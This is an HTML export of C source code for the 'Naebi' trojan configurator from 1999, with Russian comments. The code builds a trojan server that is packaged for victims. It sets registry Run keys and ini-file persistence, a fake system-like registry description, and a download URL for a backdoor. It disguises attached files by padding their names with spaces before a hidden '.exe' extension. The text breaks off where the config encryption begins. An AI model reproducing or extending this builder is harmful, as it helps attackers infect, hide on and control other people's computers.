<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">// Ровняем по 8 байт
</span><span class="sc9">#pragma pack( 8 ) 
</span><span class="sc0">
</span><span class="sc3">/********************************************************************/</span><span class="sc0">
</span><span class="sc1">/*                                                                  */</span><span class="sc0">
</span><span class="sc9">#include &lt;direct.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;windows.h&gt;
</span><span class="sc0">
</span><span class="sc2">// Смешение в файле начиная от которого начинается конфигурация
</span><span class="sc9">#define FSIZE   0x3400
</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">ConfigFormat</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">signature</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// 0x73519cae
</span><span class="sc0">   
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">version</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// Версия программы 0x03 = 2.33
</span><span class="sc0">   </span><span class="sc2">// -- Флаги ..
</span><span class="sc0">   </span><span class="sc2">// 
</span><span class="sc0">   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">attach</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">                               </span><span class="sc2">// Приписан ли в конце файл
</span><span class="sc0">   </span><span class="sc2">// - - - - - - - - - Куда писаться  - - - - - - - - - - - - - - - - - - - -
</span><span class="sc0">   
   </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">reg</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">                                  </span><span class="sc2">// LanchList
</span><span class="sc0">   </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">HKLM_Run</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">                             </span><span class="sc2">// Писаться ли в HKLM_Run
</span><span class="sc0">   </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">HKLM_Runs</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">                            </span><span class="sc2">//
</span><span class="sc0">   </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">HKCU_Run</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">                             </span><span class="sc2">//
</span><span class="sc0">   </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">startup</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">                              </span><span class="sc2">//  
</span><span class="sc0">   </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">win_ini</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">                              </span><span class="sc2">// Писаться в вин.ини
</span><span class="sc0">   </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">edial</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">                                </span><span class="sc2">// В ini edialerа
</span><span class="sc0">   </span><span class="sc2">// ---- ---------- В каком месте жить -------------------------------------
</span><span class="sc0">   </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">kuda</span><span class="sc10">:</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//00 - system , 01 -temp , 02 - win , 03 - x3
</span><span class="sc0">   </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">deleteself</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// Если да (только если есть файл) то пишем себя kuda надо
</span><span class="sc0">                      </span><span class="sc2">// А оригинального коня выносим.   
</span><span class="sc0">   
   </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">winstart</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// В винстарт.бат
</span><span class="sc0">   </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">sys_ini</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// В систем.ини
</span><span class="sc0">   </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">mirc</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc2">// Писаться в Мирк
</span><span class="sc0">   </span><span class="sc2">// ------------------------------------------------------------------------
</span><span class="sc0">   </span><span class="sc2">//  Потом еще чего нитть добавлю   
</span><span class="sc0">   </span><span class="sc2">// -----
</span><span class="sc0">   </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">foff</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//Смешение Файла
</span><span class="sc0">   
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">[</span><span class="sc4">64</span><span class="sc10">];</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">id</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">];</span><span class="sc0">         </span><span class="sc2">// Уникальный идентификатор ( nuke2000 / trojan1/ VasPupkn )
</span><span class="sc0">   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">url</span><span class="sc10">[</span><span class="sc4">64</span><span class="sc10">];</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">];</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">trojname</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">];</span><span class="sc0">  </span><span class="sc2">// -Как назвать файл трояна у жертвы( msWinRun,msgsrv32)
</span><span class="sc0">   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">desc</span><span class="sc10">[</span><span class="sc4">32</span><span class="sc10">];</span><span class="sc0">    </span><span class="sc2">//  -Описалово в реестре трояна ( System ,Kernel32 etc)
</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc11">ConfigFormat</span><span class="sc10">,*</span><span class="sc0"> </span><span class="sc11">pConfigFormat</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">ConfigFormat</span><span class="sc0"> </span><span class="sc11">config</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">nexe</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0x100</span><span class="sc10">],</span><span class="sc11">buf2</span><span class="sc10">[</span><span class="sc4">0x100</span><span class="sc10">],</span><span class="sc11">ini</span><span class="sc10">[</span><span class="sc4">0x200</span><span class="sc10">],</span><span class="sc11">buf3</span><span class="sc10">[</span><span class="sc4">0x1000</span><span class="sc10">],</span><span class="sc11">attach</span><span class="sc10">[</span><span class="sc4">0x200</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">dat</span><span class="sc10">[</span><span class="sc4">0x8000</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ini1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"config.ini"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc11">k</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc11">st</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">FILE</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">h_f</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">FILE</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">h_f1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">dot</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc6">"   ==========================================================\n"</span><span class="sc0">
        </span><span class="sc6">"   =                 Haebu  Coceda  configurator            =\n"</span><span class="sc0">
        </span><span class="sc6">"   =                                                        =\n"</span><span class="sc0">
        </span><span class="sc6">"   =              1999     Dr.Null (L)                      =\n"</span><span class="sc0">
        </span><span class="sc6">"   =                                                        =\n"</span><span class="sc0">
        </span><span class="sc6">"   =                           http://naebi.tsx.org         =\n"</span><span class="sc0">
        </span><span class="sc6">"   =   v 2.33                  http://xbx.ipc.ru/naebi      =\n"</span><span class="sc0">
        </span><span class="sc6">"   =                           http://www.astalavista.ru/ns =\n"</span><span class="sc0">
        </span><span class="sc6">"   = 2and30@iname.com                                       =\n"</span><span class="sc0"> 
        </span><span class="sc6">"   ==========================================================\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc10">&lt;</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\nUsage: config Naebi-Server.exe [attached-file.jpg] \n"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">
    
   
    
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">exe</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
    
    
    
    </span><span class="sc2">//Открываем экзешник
</span><span class="sc0">    </span><span class="sc11">h_f</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">exe</span><span class="sc10">,</span><span class="sc6">"r+b"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">h_f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Error: cannot open file %s\n"</span><span class="sc10">,</span><span class="sc11">exe</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc2">//его длина?
</span><span class="sc0">    

</span><span class="sc2">//  fseek(h_f,0,SEEK_END);
//  f_s = ftell(h_f);
</span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">h_f</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">config</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">ConfigFormat</span><span class="sc10">));</span><span class="sc0">
    
</span><span class="sc11">GetCurrentDirectory</span><span class="sc10">(</span><span class="sc4">0x100</span><span class="sc10">,</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc10">&gt;</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">d1</span><span class="sc10">[</span><span class="sc4">0x200</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">strncpy</span><span class="sc10">(</span><span class="sc11">d1</span><span class="sc10">,</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">],</span><span class="sc4">255</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">nexe</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strrchr</span><span class="sc10">(</span><span class="sc11">d1</span><span class="sc10">,</span><span class="sc7">'\\'</span><span class="sc10">)?</span><span class="sc11">strrchr</span><span class="sc10">(</span><span class="sc11">d1</span><span class="sc10">,</span><span class="sc7">'\\'</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">:</span><span class="sc11">d1</span><span class="sc0">   </span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Subname : %s\n"</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc11">nexe</span><span class="sc10">);</span><span class="sc0">
    
    
    
  </span><span class="sc11">h_f1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">],</span><span class="sc6">"rb"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">h_f1</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">attach</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> 
  </span><span class="sc11">strncpy</span><span class="sc10">(</span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">nexe</span><span class="sc10">,</span><span class="sc4">30</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">ini</span><span class="sc10">,</span><span class="sc6">"%s\\%s"</span><span class="sc10">,</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc11">ini1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">" - %s -\n"</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc2">//----------------------грузим дату из ini файла----------------------
</span><span class="sc0">    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">signature</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x73519cae</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"main"</span><span class="sc10">;</span><span class="sc0">
        
    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">HKLM_Run</span><span class="sc0">  </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetPrivateProfileInt</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"HKLM_Run"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">HKLM_Runs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetPrivateProfileInt</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"HKLM_Runs"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">HKCU_Run</span><span class="sc0">  </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetPrivateProfileInt</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"HKCU_Run"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">startup</span><span class="sc0">   </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetPrivateProfileInt</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"startup"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">win_ini</span><span class="sc0">   </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetPrivateProfileInt</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"win_ini"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">reg</span><span class="sc0">       </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetPrivateProfileInt</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"reg"</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">edial</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetPrivateProfileInt</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"edial"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc2">// Куда еще писаться -- присылайте свои места
</span><span class="sc0">    </span><span class="sc2">//Наеби самый хуй-отьебешься троян Кже-Кхе :)
</span><span class="sc0">    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">sys_ini</span><span class="sc0">   </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetPrivateProfileInt</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"sys_ini"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">winstart</span><span class="sc0">  </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetPrivateProfileInt</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"Write2Winstart"</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">mirc</span><span class="sc0">      </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetPrivateProfileInt</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"Write2Mirc"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">deleteself</span><span class="sc0">  </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetPrivateProfileInt</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"deleteself"</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">version</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x03</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// 2.33
</span><span class="sc0">
    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">kuda</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetPrivateProfileInt</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"kuda"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">
    
    
    </span><span class="sc2">// - Как мы называемся?
</span><span class="sc0">    </span><span class="sc11">GetPrivateProfileString</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"id"</span><span class="sc10">,</span><span class="sc6">" txt "</span><span class="sc10">,</span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">id</span><span class="sc10">,</span><span class="sc4">8</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc2">// - Какое УРЛ закачивать (для обновления или просто БО какое нибудь..)
</span><span class="sc0">    </span><span class="sc11">GetPrivateProfileString</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"url"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">url</span><span class="sc10">,</span><span class="sc4">64</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc2">//  - Какое имя у трояна?  что-то.exe
</span><span class="sc0">    </span><span class="sc11">GetPrivateProfileString</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"trojname"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">trojname</span><span class="sc10">,</span><span class="sc4">8</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc2">//  - Описание в реестре..
</span><span class="sc0">    </span><span class="sc11">GetPrivateProfileString</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"desc"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">desc</span><span class="sc10">,</span><span class="sc4">32</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc2">// - Мыло? 
</span><span class="sc0">    </span><span class="sc11">GetPrivateProfileString</span><span class="sc10">(</span><span class="sc11">sec</span><span class="sc10">,</span><span class="sc6">"email"</span><span class="sc10">,</span><span class="sc6">"dr-n00ll@null.ru"</span><span class="sc10">,</span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">email</span><span class="sc10">,</span><span class="sc4">64</span><span class="sc10">,</span><span class="sc11">ini</span><span class="sc10">);</span><span class="sc0">



    

    
</span><span class="sc11">_mkdir</span><span class="sc10">(</span><span class="sc6">"InFeCteD"</span><span class="sc10">);</span><span class="sc0">




</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">attach</span><span class="sc10">){</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">],</span><span class="sc6">".exe"</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf3</span><span class="sc10">,</span><span class="sc6">"InFeCteD\\%s"</span><span class="sc10">,</span><span class="sc11">nexe</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf3</span><span class="sc10">,</span><span class="sc6">"InFeCteD\\%s%50s%50s%50s%40s.exe"</span><span class="sc10">,</span><span class="sc11">nexe</span><span class="sc10">,</span><span class="sc6">" "</span><span class="sc10">,</span><span class="sc6">" "</span><span class="sc10">,</span><span class="sc6">" "</span><span class="sc10">,</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0"> 
</span><span class="sc5">else</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf3</span><span class="sc10">,</span><span class="sc6">"InFeCteD\\Trojan33.exe"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc2">//Копируем Kоня для конфигурения в Infected
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Copy:  exe = %s  --&gt; buf3=%s\n"</span><span class="sc10">,</span><span class="sc11">exe</span><span class="sc10">,</span><span class="sc11">buf3</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">exe</span><span class="sc10">,</span><span class="sc11">buf3</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">//printf("here1\n");
</span><span class="sc0">
</span><span class="sc11">h_f</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">buf3</span><span class="sc10">,</span><span class="sc6">"r+b"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">h_f</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">){</span><span class="sc0"> 
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Cannot open resulting file for write config data \n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc2">//пишем в экзешник
</span><span class="sc0">    
    </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FSIZE</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">ConfigFormat</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">// ???
</span><span class="sc0">    </span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">foff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">" sizeof of Config: %d foff %d \n"</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ConfigFormat</span><span class="sc10">),</span><span class="sc11">config</span><span class="sc10">.</span><span class="sc11">foff</span><span class="sc10">);</span><span class="sc0">

    
    
    </span><span class="sc11">fseek</span><span class="sc10">(</span><span class="sc11">h_f</span><span class="sc10">,</span><span class="sc11">FSIZE</span><span class="sc10">,</span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
    
        
    
    
  </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Write config at : %d\n"</span><span class="sc10">,</span><span class="sc11">ftell</span><span class="sc10">(</span><span class="sc11">h_f</span><span class="sc10">));</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">uk</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">config</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc2">// Примитивнейший crypt 
